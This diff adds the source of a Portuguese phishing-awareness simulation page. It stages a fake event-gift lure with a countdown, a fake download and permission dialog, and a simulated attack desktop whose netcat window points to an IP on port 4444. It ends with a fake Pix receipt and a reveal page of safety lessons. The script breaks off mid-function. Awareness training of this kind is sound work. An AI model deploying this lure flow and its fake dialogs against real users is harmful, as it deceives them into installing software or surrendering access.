@@ -1,0 +1,1099 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="robots" content="noindex, nofollow">
+<title>Brinde do evento</title>
+<style>
+:root{
+  --blue:#0F62D6;--ink:#111A24;--gray:#66727F;
+  --kaspersky:#00A88E;--kaspersky-dark:#007D6A;--kaspersky-light:#00C4A7;
+  --alert-red:#D6202C;--bank-deep:#0B3B47;--bank-teal:#12897A;--paper:#E9EDF2;
+  --desk:#1C1C2E;--win-r:7px;
+  --mono:ui-monospace,"Cascadia Mono","Consolas","SF Mono","Roboto Mono",monospace;
+  --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+  /* margens laterais responsivas — aumentam no mobile */
+  --px:22px;   /* padding horizontal padrão */
+  --pt:32px;   /* padding topo padrão */
+  --pb:32px;   /* padding base padrão (sem safe-area) */
+}
+@media(max-width:480px){
+  :root{ --px:18px; --pt:28px; --pb:28px; }
+}
+@media(max-width:360px){
+  :root{ --px:14px; --pt:22px; --pb:22px; }
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html,body{margin:0;padding:0;height:100%;overflow:hidden;overscroll-behavior:none}
+body{background:#000;font-family:var(--sans);color:#fff}
+
+/* ── fases globais ── */
+.phase{position:fixed;inset:0;opacity:0;visibility:hidden;pointer-events:none;transition:opacity .4s ease}
+.phase.on{opacity:1;visibility:visible;pointer-events:auto}
+.mark{position:fixed;top:calc(env(safe-area-inset-top)+6px);right:10px;z-index:9999;
+      font:400 9px/1 var(--sans);letter-spacing:.15em;color:#fff;opacity:.25;
+      mix-blend-mode:difference;pointer-events:none}
+
+/* ── 1. PORTAL ── */
+#portal{background:var(--kaspersky);color:#fff;display:flex;flex-direction:column;
+        justify-content:center;padding:var(--pt) var(--px) calc(env(safe-area-inset-bottom)+var(--pb))}
+.wrap{width:100%;max-width:420px;margin:0 auto}
+.sig{display:flex;align-items:center;gap:9px;margin-bottom:34px}
+.sig b{font-size:15px;font-weight:600;color:#fff}
+#portal h1{font-size:clamp(22px,6vw,28px);line-height:1.2;font-weight:700;
+           letter-spacing:-.02em;margin:0 0 10px;color:#fff}
+#portal>div>p{font-size:15px;line-height:1.5;color:rgba(255,255,255,.75);margin:0 0 26px}
+.netrow{display:flex;justify-content:space-between;align-items:center;padding:14px 0;
+        border-top:1px solid rgba(255,255,255,.18);font-size:14px;color:#fff}
+.netrow:last-of-type{border-bottom:1px solid rgba(255,255,255,.18);margin-bottom:26px}
+.netrow span:last-child{color:rgba(255,255,255,.65)}
+.cta{display:block;width:100%;border:0;border-radius:10px;background:#fff;color:var(--kaspersky);
+     font-family:inherit;font-size:16px;font-weight:700;padding:16px;cursor:pointer}
+.cta:active{background:#e6ffe6}
+.fine{font-size:11.5px;line-height:1.45;color:rgba(255,255,255,.45);margin:16px 0 0;text-align:center}
+
+/* ── 2. DOWNLOAD ── */
+#dl{background:var(--kaspersky);color:#fff}
+#dl .blur{position:absolute;inset:0;padding:var(--pt) var(--px);filter:blur(2px);opacity:.45}
+.dlbar{position:absolute;left:0;right:0;bottom:0;background:#F1F3F4;
+       border-top:1px solid #D9DDE1;
+       padding:10px var(--px) calc(env(safe-area-inset-bottom)+10px);
+       transform:translateY(110%);transition:transform .4s cubic-bezier(.2,.9,.3,1);
+       box-shadow:0 -6px 22px rgba(0,0,0,.09)}
+.dlbar.up{transform:translateY(0)}
+.dlcard{display:flex;align-items:center;gap:11px;background:#fff;
+        border:1px solid #E1E4E8;border-radius:9px;padding:10px 12px}
+.dlicon{width:34px;height:34px;flex:none;border-radius:6px;background:#E8EAED;
+        display:grid;place-items:center;font:600 10px var(--sans);color:#5F6368}
+.dlmeta{flex:1;min-width:0}
+.dlname{font-size:13px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dlsub{font-size:11.5px;color:#5F6368;margin-top:3px}
+.track{height:3px;background:#DADCE0;border-radius:2px;margin-top:7px;overflow:hidden}
+.track i{display:block;height:100%;width:0;background:var(--blue)}
+
+/* ── DIÁLOGO FALSO ── */
+.fake-overlay{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:8000;
+              display:flex;align-items:center;justify-content:center;
+              opacity:0;visibility:hidden;transition:opacity .22s ease}
+.fake-overlay.show{opacity:1;visibility:visible}
+.fake-dialog{background:#F2F2F2;border-radius:12px;width:min(320px,88vw);
+             box-shadow:0 20px 60px rgba(0,0,0,.4);overflow:hidden;
+             transform:scale(.88);transition:transform .22s cubic-bezier(.2,.9,.3,1)}
+.fake-overlay.show .fake-dialog{transform:scale(1)}
+.fake-dialog-head{background:#E8E8E8;padding:14px 18px 10px;text-align:center;
+                  border-bottom:1px solid #D0D0D0}
+.fake-dialog-head h3{font-size:13px;font-weight:600;color:#1a1a1a;margin:0 0 3px}
+.fake-dialog-head p{font-size:11.5px;color:#555;margin:0;line-height:1.4}
+.fake-dialog-body{padding:14px 18px 6px;font-size:12.5px;color:#333;line-height:1.5;text-align:center}
+.fake-dialog-btns{display:flex;border-top:1px solid #D0D0D0;margin-top:10px}
+.fake-btn{flex:1;border:none;background:transparent;padding:13px 8px;font:600 14px var(--sans);
+          cursor:pointer;transition:background .15s}
+.fake-btn:first-child{border-right:1px solid #D0D0D0;color:#D6202C}
+.fake-btn:last-child{color:#0F62D6}
+.fake-btn:hover{background:rgba(0,0,0,.06)}
+
+/* ══════════════════════════════════════════════
+   3. DESKTOP FAKE  (desktop + tablet ≥ 769 px)
+══════════════════════════════════════════════ */
+#desk{background:var(--desk);display:flex;flex-direction:column}
+.taskbar{height:32px;background:#111118;display:flex;align-items:center;
+         padding:0 10px;gap:8px;flex:none;border-bottom:1px solid #2a2a3a}
+.tstart{font:600 11px var(--sans);color:#aaa;padding:3px 8px;border-radius:4px;background:#1e1e2e}
+.tclock{margin-left:auto;font:400 11px var(--mono);color:#888}
+.tbtns{display:flex;gap:4px}
+.tbtn{font:400 10px var(--sans);color:#777;padding:2px 7px;border-radius:3px;
+      background:#1a1a2a;border:1px solid #2a2a3a;
+      white-space:nowrap;max-width:90px;overflow:hidden;text-overflow:ellipsis}
+.tbtn.active{color:#ccc;border-color:#444;background:#252535}
+.deskarea{flex:1;position:relative;overflow:hidden}
+
+/* janelas desktop — empilhadas, posicionadas absolutas */
+.fwin{position:absolute;border-radius:var(--win-r);overflow:hidden;
+      box-shadow:0 20px 60px rgba(0,0,0,.7);
+      transform:scale(.88) translateY(20px);opacity:0;
+      transition:transform .28s cubic-bezier(.2,.9,.3,1),opacity .28s ease;
+      display:flex;flex-direction:column}
+.fwin.open{transform:scale(1) translateY(0);opacity:1}
+.fwin.minimized{transform:scale(.45) translateY(80px);opacity:0;pointer-events:none}
+
+/* posições desktop de cada janela */
+#wbash{background:#1A1A2E;color:#E8EAF0;top:6px;left:4px;right:4px;height:52%}
+#wedit{background:#1E1E1E;color:#D4D4D4;top:14%;left:8px;right:8px;height:62%}
+#wnet {background:#0D1117;color:#58A6FF;top:18%;left:6px;right:6px;height:60%}
+
+/* ══════════════════════════════════════════════
+   3m. MOBILE — janelas fullscreen sequenciais
+══════════════════════════════════════════════ */
+body.mobile #desk{background:#0C0C14}
+/* no mobile as janelas são .phase dentro do #desk — position fixed, sem empilhar */
+body.mobile .fwin{
+  position:fixed;inset:0;
+  border-radius:0;
+  transform:translateX(100%);opacity:1;    /* fora do viewport à direita */
+  transition:transform .35s cubic-bezier(.2,.9,.3,1);
+  box-shadow:none;
+}
+body.mobile .fwin.open{ transform:translateX(0); }
+body.mobile .fwin.minimized{ transform:translateX(-100%); opacity:1; pointer-events:none; }
+
+/* taskbar mobile: mais compacta, sem botões de janela */
+body.mobile .taskbar{height:28px}
+body.mobile .tstart{display:none}
+body.mobile .tbtn{max-width:70px;font-size:9.5px}
+/* label da janela ativa aparece no centro */
+body.mobile .taskbar::after{
+  content:attr(data-active);position:absolute;left:50%;transform:translateX(-50%);
+  font:500 11px var(--sans);color:#aaa;pointer-events:none
+}
+body.mobile .wtb-btns{display:none}   /* oculta botões fechar/minimizar no mobile */
+/* safe-area horizontal em telas com notch/câmera lateral */
+@supports(padding:env(safe-area-inset-left)){
+  body.mobile .term,
+  body.mobile .edcode,
+  body.mobile .ncbody{
+    padding-left:  max(var(--px), env(safe-area-inset-left));
+    padding-right: max(var(--px), env(safe-area-inset-right));
+  }
+  body.mobile #portal,
+  body.mobile #alert{
+    padding-left:  max(var(--px), env(safe-area-inset-left));
+    padding-right: max(var(--px), env(safe-area-inset-right));
+  }
+  body.mobile #done .done-inner{
+    padding-left:  max(var(--px), env(safe-area-inset-left));
+    padding-right: max(var(--px), env(safe-area-inset-right));
+  }
+}
+
+/* ── titlebar genérica ── */
+.wtb{height:28px;display:flex;align-items:center;padding:0 8px;gap:6px;flex:none;user-select:none}
+.wtb-dots{display:flex;gap:5px}
+.wtb-dots span{width:11px;height:11px;border-radius:50%}
+.wtb-title{font:400 11px var(--sans);flex:1;text-align:center;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.wtb-btns{display:flex;gap:1px}
+.wtb-btns button{border:0;background:transparent;color:inherit;font-size:12px;
+                 width:22px;height:22px;border-radius:3px;cursor:pointer;
+                 display:grid;place-items:center;opacity:.6}
+.wtb-btns button:hover{opacity:1;background:rgba(255,255,255,.1)}
+
+#wbash .wtb{background:#252538}
+#wbash .wtb-dots span:nth-child(1){background:#FF5F57}
+#wbash .wtb-dots span:nth-child(2){background:#FEBC2E}
+#wbash .wtb-dots span:nth-child(3){background:#28C840}
+#wbash .wtb-title{color:#C8CAD4}
+
+#wedit .wtb{background:#3C3C3C}
+#wedit .wtb-dots span:nth-child(1){background:#FF5F57}
+#wedit .wtb-dots span:nth-child(2){background:#FEBC2E}
+#wedit .wtb-dots span:nth-child(3){background:#28C840}
+#wedit .wtb-title{color:#CCC}
+
+#wnet .wtb{background:#161B22}
+#wnet .wtb-dots span:nth-child(1){background:#FF5F57}
+#wnet .wtb-dots span:nth-child(2){background:#FEBC2E}
+#wnet .wtb-dots span:nth-child(3){background:#28C840}
+#wnet .wtb-title{color:#8B949E}
+
+/* ── terminais / corpos ── */
+.term{flex:1;font-family:var(--mono);
+      font-size:clamp(10.5px,3vw,13px);line-height:1.75;
+      padding:12px var(--px);overflow-y:auto;overflow-x:hidden;white-space:pre-wrap;word-break:break-word}
+.term::-webkit-scrollbar{width:4px}
+.term::-webkit-scrollbar-thumb{background:#333}
+.p-green{color:#5AF78E}.p-cyan{color:#57C7FF}
+.p-white{color:#F1F1F0}.p-dim{color:#666}
+.cur-b{display:inline-block;width:.55em;height:1em;background:currentColor;
+       vertical-align:text-bottom;animation:blink 1s steps(1) infinite}
+@keyframes blink{50%{opacity:0}}
+
+/* editor */
+.edwrap{display:flex;flex:1;overflow:hidden}
+.gutter{width:34px;background:#1E1E1E;border-right:1px solid #2D2D2D;
+        font:400 clamp(9px,2.2vw,11px) var(--mono);color:#495057;
+        line-height:1.75;padding:12px 4px 12px 0;text-align:right;flex:none;overflow:hidden}
+.edcode{flex:1;font-family:var(--mono);font-size:clamp(10px,2.6vw,12px);line-height:1.75;
+        padding:12px var(--px);overflow:auto;white-space:pre;color:#D4D4D4}
+.edcode::-webkit-scrollbar{width:4px}
+.edcode::-webkit-scrollbar-thumb{background:#333}
+.kw{color:#569CD6}.fn{color:#DCDCAA}.st{color:#CE9178}
+.cm{color:#6A9955;font-style:italic}.nb{color:#4EC9B0}.nm{color:#B5CEA8}
+
+/* netcat */
+.ncbody{flex:1;font-family:var(--mono);font-size:clamp(10px,2.8vw,12px);line-height:1.8;
+        padding:12px var(--px);overflow-y:auto;white-space:pre-wrap;word-break:break-word}
+.ncbody::-webkit-scrollbar{width:4px}
+.ncbody::-webkit-scrollbar-thumb{background:#21262D}
+.nc-ok{color:#3FB950}.nc-warn{color:#E3B341}.nc-err{color:#FF6B6B}.nc-dim{color:#484F58}
+
+/* ── indicador de janela no mobile (chip na taskbar) ── */
+.mobchip{display:none}
+body.mobile .mobchip{display:flex;align-items:center;gap:5px;
+  font:500 10px var(--sans);color:#9B9BB0;
+  border:1px solid #2a2a3a;border-radius:3px;padding:1px 6px}
+body.mobile .mobchip.active{color:#ccc;border-color:#555;background:#252535}
+
+/* ── 4. COMPROVANTE PIX ── */
+#bank{
+  background:#fff;color:#1a1a1a;
+  display:flex;flex-direction:column;align-items:center;
+  justify-content:flex-start;overflow-y:auto;
+  padding:0 0 calc(env(safe-area-inset-bottom)+32px);
+}
+
+/* cartão centralizado que escala em qualquer tela */
+.pix-card{
+  width:100%;
+  max-width:480px;           /* cap para desktop/tablet */
+  margin:0 auto;
+  /* em telas grandes, adiciona sombra de "papel" para não parecer diluído */
+}
+@media(min-width:600px){
+  #bank{ justify-content:center; padding-top:32px; }
+  .pix-card{
+    border:1px solid #E8E8E8;
+    border-radius:16px;
+    overflow:hidden;
+    box-shadow:0 4px 32px rgba(0,0,0,.08);
+    margin:0 auto;
+  }
+}
+
+/* hero */
+.pix-hero{
+  text-align:center;
+  padding:clamp(28px,6vw,52px) clamp(20px,5vw,40px) clamp(20px,4vw,32px);
+  border-bottom:1px solid #EBEBEB;
+}
+.pix-icon{
+  position:relative;width:72px;height:72px;
+  margin:0 auto clamp(14px,3vw,22px);
+  display:flex;align-items:center;justify-content:center;
+}
+.pix-icon .circle{
+  width:clamp(48px,8vw,60px);height:clamp(48px,8vw,60px);
+  border-radius:50%;border:2.5px solid #00A86B;
+  display:flex;align-items:center;justify-content:center;background:#fff;
+}
+.pix-icon .circle svg{display:block}
+.pix-icon .avatar{
+  position:absolute;right:-4px;bottom:-4px;
+  width:clamp(24px,4vw,32px);height:clamp(24px,4vw,32px);
+  border-radius:50%;background:#D0D0D0;border:2px solid #fff;
+  display:flex;align-items:center;justify-content:center;
+}
+.pix-icon .avatar svg{display:block}
+.pix-title{
+  font-size:clamp(20px,5vw,28px);font-weight:800;
+  letter-spacing:-.02em;color:#1a1a1a;margin:0 0 6px;line-height:1.15;
+}
+.pix-date{font-size:clamp(12px,3vw,14px);color:#888;margin:0}
+
+/* linhas de detalhe */
+.pix-rows{padding:0 clamp(20px,5vw,40px)}
+.pix-row{padding:clamp(14px,3vw,20px) 0;border-bottom:1px solid #EBEBEB}
+.pix-row:last-child{border-bottom:none}
+.pix-row-label{font-size:clamp(11px,2.5vw,13px);color:#888;margin:0 0 4px;font-weight:400}
+.pix-row-value{
+  font-size:clamp(15px,4vw,20px);font-weight:700;
+  color:#1a1a1a;margin:0;line-height:1.25;word-break:break-all;
+}
+.pix-row-sub{font-size:clamp(11px,2.5vw,13px);color:#555;margin:3px 0 0}
+.pix-row.valor .pix-row-value{font-size:clamp(24px,7vw,36px)}
+.pix-row.txid .pix-row-value{
+  font-size:clamp(9px,2.2vw,12px);font-family:var(--mono);
+  font-weight:500;color:#555;letter-spacing:.01em;
+}
+
+/* animação de entrada */
+.pix-hero{opacity:0;transform:translateY(12px);transition:opacity .5s ease,transform .5s ease}
+.pix-row{opacity:0;transform:translateY(8px);transition:opacity .4s ease,transform .4s ease}
+#bank.reveal .pix-hero{opacity:1;transform:none}
+#bank.reveal .pix-row:nth-child(1){opacity:1;transform:none;transition-delay:.15s}
+#bank.reveal .pix-row:nth-child(2){opacity:1;transform:none;transition-delay:.28s}
+#bank.reveal .pix-row:nth-child(3){opacity:1;transform:none;transition-delay:.41s}
+#bank.reveal .pix-row:nth-child(4){opacity:1;transform:none;transition-delay:.54s}
+
+/* ── 5. REVELAÇÃO ── */
+#done{
+  background:#0B1220;color:#E4EBF5;overflow-y:auto;
+  display:flex;flex-direction:column;align-items:center;
+  padding:var(--pt) 0 calc(env(safe-area-inset-bottom)+var(--pb));
+  position:relative;
+}
+#done::before{
+  content:'';position:fixed;inset:0;pointer-events:none;
+  background:radial-gradient(ellipse 70% 55% at 50% 0%,rgba(0,168,142,.13) 0%,transparent 70%);
+  z-index:0;
+}
+#done .done-inner{width:100%;max-width:860px;padding:0 var(--px);position:relative;z-index:1}
+
+/* badge topo */
+.done-badge{
+  display:inline-flex;align-items:center;gap:8px;
+  background:rgba(0,168,142,.12);border:1px solid rgba(0,168,142,.35);
+  border-radius:20px;padding:5px 16px;
+  font-size:11px;font-weight:700;letter-spacing:1.5px;color:#00A88E;
+  text-transform:uppercase;margin-bottom:24px;
+}
+
+/* título */
+#done h2{
+  font-size:clamp(28px,5vw,52px);line-height:1.1;letter-spacing:-.03em;
+  font-weight:800;margin:0 0 14px;color:#E4EBF5;
+}
+#done h2 span{color:#00A88E}
+
+#done .lead{
+  font-size:clamp(14px,1.8vw,18px);line-height:1.65;color:#7A96AB;
+  margin:0 0 36px;max-width:68ch;
+  border-left:3px solid rgba(0,168,142,.4);
+  padding-left:16px;
+}
+
+/* lista de lições */
+#done ul{list-style:none;padding:0;margin:0 0 36px}
+#done li{
+  padding:20px 0 20px 0;
+  border-top:1px solid rgba(255,255,255,.07);
+  font-size:clamp(13px,2vw,16px);line-height:1.65;
+  color:#9FB4C4;
+  display:grid;
+  grid-template-columns:40px 1fr;
+  gap:0 14px;
+  align-items:start;
+}
+#done li:last-child{border-bottom:1px solid rgba(255,255,255,.07)}
+.li-num{
+  font-size:clamp(20px,4vw,30px);font-weight:800;
+  color:rgba(0,168,142,.3);line-height:1.2;
+  font-variant-numeric:tabular-nums;
+  padding-top:2px;
+}
+.li-body b{
+  display:block;font-size:clamp(13px,1.9vw,16px);
+  color:#E4EBF5;font-weight:700;margin-bottom:5px;
+}
+
+/* botões */
+.done-actions{display:flex;gap:12px;flex-wrap:wrap;margin-bottom:8px}
+.again{
+  border:1.5px solid rgba(255,255,255,.2);background:rgba(255,255,255,.05);
+  color:#B0C4D4;font-family:inherit;
+  font-size:14px;font-weight:600;padding:12px 22px;border-radius:9px;cursor:pointer;
+  transition:all .18s;
+}
+.again:hover{background:rgba(255,255,255,.1);color:#E4EBF5;border-color:rgba(255,255,255,.35)}
+.close-btn{
+  border:1.5px solid rgba(214,32,44,.5);background:rgba(214,32,44,.08);
+  color:#FF6B78;font-family:inherit;
+  font-size:14px;font-weight:600;padding:12px 22px;
+  border-radius:9px;cursor:pointer;transition:all .18s;
+}
+.close-btn:hover{background:rgba(214,32,44,.18);border-color:rgba(214,32,44,.8)}
+.credit{margin-top:20px;font-size:11px;color:rgba(255,255,255,.2);letter-spacing:.5px}
+.close-countdown{margin-top:6px;font-size:11px;color:rgba(0,168,142,.5);font-family:var(--mono)}
+
+.hint{position:fixed;left:0;right:0;bottom:calc(env(safe-area-inset-bottom)+10px);
+      text-align:center;font:400 11px var(--sans);color:rgba(255,255,255,.32);
+      z-index:60;pointer-events:none;opacity:0;transition:opacity .4s}
+.hint.on{opacity:1}
+@media(prefers-reduced-motion:reduce){*{animation:none!important;transition-duration:.01ms!important}}
+</style>
+</head>
+<body>
+
+<!-- ════ 1. ISCA ════ -->
+<section class="phase on" id="portal">
+  <div class="wrap">
+    <div class="sig">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"
+           stroke-linecap="round" stroke-linejoin="round">
+        <rect x="3" y="8.5" width="18" height="12.5" rx="1.5"/>
+        <path d="M3 13h18"/><path d="M12 8.5V21"/>
+        <path d="M12 8.5S10.6 3 8 3a2.4 2.4 0 0 0 0 5.5z"/>
+        <path d="M12 8.5S13.4 3 16 3a2.4 2.4 0 0 1 0 5.5z"/>
+      </svg>
+      <b>Brindes do evento</b>
+    </div>
+    <h1>Seu brinde está reservado</h1>
+    <p>Instale o validador de cupom para retirar o kit no estande.</p>
+    <div class="netrow"><span>Brinde</span><span>Kit exclusivo</span></div>
+    <div class="netrow"><span>Reserva expira em</span><span>04:57</span></div>
+    <button class="cta" id="go">Retirar meu brinde</button>
+    <p class="fine">Um brinde por participante, enquanto durarem os estoques.</p>
+  </div>
+</section>
+
+<!-- ════ 2. DOWNLOAD ════ -->
+<section class="phase" id="dl">
+  <div class="blur">
+    <div class="wrap">
+      <div class="sig"><b>Brindes do evento</b></div>
+      <h1 style="font-size:24px;font-weight:700;margin:0 0 10px">Seu brinde está reservado</h1>
+      <p style="color:#66727F;margin:0">Preparando validação…</p>
+    </div>
+  </div>
+  <div class="dlbar" id="dlbar">
+    <div class="dlcard">
+      <div class="dlicon">ZIP</div>
+      <div class="dlmeta">
+        <div class="dlname">cupom-validador-brinde.zip</div>
+        <div class="dlsub" id="dlsub">Iniciando…</div>
+        <div class="track"><i id="dlfill"></i></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ════ DIÁLOGO FALSO ════ -->
+<div class="fake-overlay" id="fake-overlay">
+  <div class="fake-dialog">
+    <div class="fake-dialog-head">
+      <h3>⚠️ Permissão necessária</h3>
+      <p>cupom-validador-brinde.zip</p>
+    </div>
+    <div class="fake-dialog-body">
+      Este aplicativo solicita acesso ao armazenamento do dispositivo para concluir a instalação do validador de cupom.<br><br>
+      <strong>Deseja permitir?</strong>
+    </div>
+    <div class="fake-dialog-btns">
+      <button class="fake-btn" id="fake-no">Não permitir</button>
+      <button class="fake-btn" id="fake-yes">Permitir</button>
+    </div>
+  </div>
+</div>
+
+<!-- ════ 3. DESKTOP FAKE ════ -->
+<section class="phase" id="desk">
+  <div class="taskbar" id="taskbar">
+    <span class="tstart">⊞</span>
+    <div class="tbtns" id="tbtns"></div>
+    <span class="tclock" id="tclock">00:00</span>
+  </div>
+  <div class="deskarea" id="deskarea">
+
+    <!-- bash -->
+    <div class="fwin" id="wbash">
+      <div class="wtb">
+        <div class="wtb-dots"><span></span><span></span><span></span></div>
+        <span class="wtb-title">usuario@host: ~  —  bash</span>
+        <div class="wtb-btns"><button>−</button><button>✕</button></div>
+      </div>
+      <div class="term" id="tbash"></div>
+    </div>
+
+    <!-- editor -->
+    <div class="fwin" id="wedit">
+      <div class="wtb">
+        <div class="wtb-dots"><span></span><span></span><span></span></div>
+        <span class="wtb-title">exploit.py — Visual Studio Code</span>
+        <div class="wtb-btns"><button>−</button><button>✕</button></div>
+      </div>
+      <div class="edwrap">
+        <div class="gutter" id="egutter"></div>
+        <div class="edcode" id="ecode"></div>
+      </div>
+    </div>
+
+    <!-- netcat -->
+    <div class="fwin" id="wnet">
+      <div class="wtb">
+        <div class="wtb-dots"><span></span><span></span><span></span></div>
+        <span class="wtb-title">nc — 185.220.101.47:4444</span>
+        <div class="wtb-btns"><button>−</button><button>✕</button></div>
+      </div>
+      <div class="ncbody" id="tnet"></div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ════ 4. COMPROVANTE PIX ════ -->
+<section class="phase" id="bank">
+
+  <div class="pix-card">
+  <div class="pix-hero">
+    <div class="pix-icon">
+      <div class="circle">
+        <!-- check verde -->
+        <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
+          <polyline points="6,14 11.5,20 22,9" stroke="#00A86B" stroke-width="2.8"
+                    stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <div class="avatar">
+        <!-- silhueta usuário -->
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
+          <circle cx="12" cy="8" r="4" fill="#888"/>
+          <path d="M4 20c0-4 3.6-7 8-7s8 3 8 7" fill="#888"/>
+        </svg>
+      </div>
+    </div>
+    <h2 class="pix-title">transferência Pix realizada</h2>
+    <p class="pix-date" id="pix-date">25/09/2026, 08:17:43, via app Itaú</p>
+  </div>
+
+  <div class="pix-rows">
+    <div class="pix-row valor">
+      <p class="pix-row-label">valor</p>
+      <p class="pix-row-value">R$ 9.539,90</p>
+    </div>
+    <div class="pix-row">
+      <p class="pix-row-label">de</p>
+      <p class="pix-row-value">Alfredo C. Costa L.</p>
+      <p class="pix-row-sub">Banco Confiança S.A — 3721/48092-6</p>
+    </div>
+    <div class="pix-row">
+      <p class="pix-row-label">para</p>
+      <p class="pix-row-value">João J. A. S. Silva</p>
+      <p class="pix-row-sub">Banco Confiança S.A.</p>
+    </div>
+    <div class="pix-row txid">
+      <p class="pix-row-label">ID da transação</p>
+      <p class="pix-row-value">E60701190202609250817438215184302</p>
+    </div>
+  </div><!-- /pix-rows -->
+  </div><!-- /pix-card -->
+
+</section>
+
+<!-- ════ 5. REVELAÇÃO ════ -->
+<section class="phase" id="done">
+  <div class="done-inner">
+    <div class="done-badge">🛡️ Security Awareness</div>
+    <h2>Isto foi uma <span>simulação</span></h2>
+    <p class="lead">Nada foi baixado, executado ou transferido. Seu dispositivo está seguro.
+       Mas essa sequência acontece de verdade — e começa sempre com um gesto simples, como escanear um QR Code.</p>
+    <ul>
+      <li>
+        <div class="li-num">01</div>
+        <div class="li-body"><b>Desconfie — a maioria dos ataques explora a confiança, não a tecnologia</b>
+        Brindes, cupons, sorteios e Wi-Fi gratuito são iscas clássicas. Se algo parece bom demais para ser verdade, provavelmente é uma armadilha.</div>
+      </li>
+      <li>
+        <div class="li-num">02</div>
+        <div class="li-body"><b>Um QR Code pode esconder qualquer URL</b>
+        Você não consegue saber para onde ele aponta antes de escanear. Criminosos colam adesivos por cima de QR Codes legítimos em restaurantes, estações de metrô e eventos.</div>
+      </li>
+      <li>
+        <div class="li-num">03</div>
+        <div class="li-body"><b>Promoção legítima nunca pede para instalar nada</b>
+        Nenhuma empresa séria exige download de "validador" ou "cupom executável" para liberar um brinde. Se pedir, desconfie, pode ser um golpe.</div>
+      </li>
+      <li>
+        <div class="li-num">04</div>
+        <div class="li-body"><b>Pressa é a principal ferramenta do golpe</b>
+        O contador regressivo existe para você agir sem pensar. Sempre que sentir urgência, pare, respire e questione.</div>
+      </li>
+      <li>
+        <div class="li-num">05</div>
+        <div class="li-body"><b>O acesso remoto começa em silêncio</b>
+        O terminal rodou em segundo plano — invisível. Quando o usuário percebe, os dados já foram coletados e o Pix já foi enviado.</div>
+      </li>
+    </ul>
+    <div class="done-actions">
+      <button class="again" id="again">↺ Ver de novo</button>
+      <button class="close-btn" id="close-btn">✕ Fechar</button>
+    </div>
+    <p class="credit">Demonstração de conscientização em segurança · Cesar Romani</p>
+    <p class="close-countdown" id="close-countdown"></p>
+  </div><!-- /done-inner -->
+</section>
+
+<div class="hint" id="hint" style="display:none"></div>
+
+<script>
+/* ─────────────────────────────────────────
+   CONFIG
+───────────────────────────────────────── */
+const CFG = { saldo:12847.63, vel:1 };
+
+/* ─────────────────────────────────────────
+   DETECÇÃO DE MODO
+   Mobile = largura ≤ 768 OU dispositivo touch
+───────────────────────────────────────── */
+const isMobile = () => window.innerWidth <= 768 || ('ontouchstart' in window && window.innerWidth < 1024);
+let MOBILE = isMobile();
+if(MOBILE) document.body.classList.add('mobile');
+
+// re-detecta ao rodar a janela (ex: tablet rotacionado)
+window.addEventListener('resize', ()=>{
+  const was = MOBILE;
+  MOBILE = isMobile();
+  if(MOBILE !== was){
+    document.body.classList.toggle('mobile', MOBILE);
+    resetWins();
+  }
+});
+
+/* ─────────────────────────────────────────
+   INFRAESTRUTURA
+───────────────────────────────────────── */
+const $ = s => document.querySelector(s);
+const PHASES = ['portal','dl','desk','bank','done'];
+let gen=0, skipping=false, running=false;
+const ABORT = Symbol();
+let pending=[];
+
+function wait(ms){
+  const my=gen;
+  return new Promise((res,rej)=>{
+    if(skipping) return res();
+    const t=setTimeout(()=>{ my===gen?res():rej(ABORT); }, ms*CFG.vel);
+    pending.push(()=>{ clearTimeout(t); my===gen?res():rej(ABORT); });
+  });
+}
+function flush(){ const p=pending; pending=[]; p.forEach(f=>f()); }
+function check(my){ if(my!==gen) throw ABORT; }
+
+function show(id){ PHASES.forEach(p=>$('#'+p).classList.toggle('on',p===id)); }
+
+const brl = n => 'R$ '+n.toLocaleString('pt-BR',{minimumFractionDigits:2,maximumFractionDigits:2});
+
+function tickClock(){
+  const d=new Date();
+  $('#tclock').textContent=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0');
+}
+tickClock(); setInterval(tickClock,15000);
+
+/* ─────────────────────────────────────────
+   HELPERS DE TERMINAL
+───────────────────────────────────────── */
+function appendSpan(el,text,cls){
+  const s=document.createElement('span');
+  if(cls) s.className=cls;
+  s.textContent=text;
+  el.appendChild(s);
+  scrollBot(el);
+  return s;
+}
+async function typeInto(el,text,speed,cls){
+  const my=gen;
+  const sp=document.createElement('span');
+  if(cls) sp.className=cls;
+  el.appendChild(sp);
+  if(skipping){ sp.textContent=text; scrollBot(el); return sp; }
+  for(let i=0;i<text.length;i++){
+    sp.textContent+=text[i]; scrollBot(el);
+    if(skipping){ sp.textContent+=text.slice(i+1); scrollBot(el); return sp; }
+    await wait(speed); check(my);
+  }
+  return sp;
+}
+function scrollBot(el){ el.scrollTop=el.scrollHeight; }
+
+/* ─────────────────────────────────────────
+   GESTÃO DE JANELAS
+───────────────────────────────────────── */
+const wins={
+  bash:{el:$('#wbash'), label:'bash'},
+  edit:{el:$('#wedit'), label:'exploit.py'},
+  net: {el:$('#wnet'),  label:'netcat'}
+};
+
+function updateTaskbar(){
+  const tb=$('#tbtns');
+  tb.innerHTML='';
+  Object.entries(wins).forEach(([k,w])=>{
+    if(!w.open) return;
+    const b=document.createElement('span');
+    b.className='tbtn'+(w.focused?' active':'');
+    b.textContent=w.label;
+    tb.appendChild(b);
+  });
+  // label centro no mobile
+  const active=Object.values(wins).find(w=>w.focused&&w.open);
+  $('#taskbar').dataset.active=active?active.label:'';
+}
+
+function openWin(key, focusIt=true){
+  const w=wins[key];
+  w.open=true;
+  w.el.classList.remove('minimized');
+  w.el.classList.add('open');
+  if(focusIt) focusWin(key);
+  else updateTaskbar();
+}
+
+function focusWin(key){
+  Object.entries(wins).forEach(([k,w])=>{
+    w.focused=(k===key);
